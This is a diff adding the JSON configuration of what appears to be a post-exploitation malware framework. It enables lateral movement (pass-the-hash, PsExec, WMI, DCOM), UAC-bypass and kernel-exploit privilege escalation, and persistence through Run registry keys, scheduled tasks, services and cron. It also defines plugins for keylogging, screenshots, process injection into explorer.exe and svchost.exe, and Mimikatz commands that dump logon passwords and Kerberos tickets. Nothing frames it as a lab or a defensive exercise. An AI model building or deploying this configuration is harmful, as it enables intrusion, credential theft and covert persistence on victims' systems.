@@ -1,0 +1,100 @@
+{
+    "module_manager": {
+        "autoload": true,
+        "directory": "plugins",
+        "hot_reload": true,
+        "max_threads": 10
+    },
+    
+    "lateral": {
+        "enabled": true,
+        "methods": {
+            "pass_the_hash": true,
+            "wmi": true,
+            "winrm": true,
+            "ssh": true,
+            "smb": true,
+            "rdp": true,
+            "psexec": true,
+            "dcom": true
+        },
+        "timeout": 60,
+        "max_targets": 100
+    },
+    
+    "privilege": {
+        "enabled": true,
+        "methods": {
+            "uac_bypass": {
+                "enabled": true,
+                "techniques": ["fodhelper", "cmstp", "eventvwr"]
+            },
+            "token_manipulation": true,
+            "potato": true,
+            "kernel_exploit": true,
+            "sudo": true
+        },
+        "timeout": 60
+    },
+    
+    "persistence": {
+        "enabled": true,
+        "methods": {
+            "registry": {
+                "enabled": true,
+                "keys": [
+                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                ]
+            },
+            "scheduled_task": {
+                "enabled": true,
+                "triggers": ["onlogon", "onstart", "daily"]
+            },
+            "service": {
+                "enabled": true,
+                "start_type": "auto"
+            },
+            "startup": {
+                "enabled": true
+            },
+            "cron": {
+                "enabled": true,
+                "schedules": ["@reboot", "@daily"]
+            },
+            "systemd": {
+                "enabled": true
+            }
+        }
+    },
+    
+    "plugins": {
+        "keylogger": {
+            "enabled": false,
+            "log_file": "~/.keylog.txt",
+            "max_size": 10485760,
+            "buffer_size": 1024
+        },
+        "screenshot": {
+            "enabled": false,
+            "quality": 80,
+            "interval": 300,
+            "format": "png",
+            "save_path": "screenshots/"
+        },
+        "mimikatz": {
+            "enabled": false,
+            "commands": [
+                "sekurlsa::logonpasswords",
+                "sekurlsa::tickets",
+                "kerberos::list"
+            ],
+            "output_file": "credentials.txt"
+        },
+        "process_injection": {
+            "enabled": false,
+            "target_processes": ["explorer.exe", "svchost.exe"],
+            "technique": "create_remote_thread"
+        }
+    }
+}
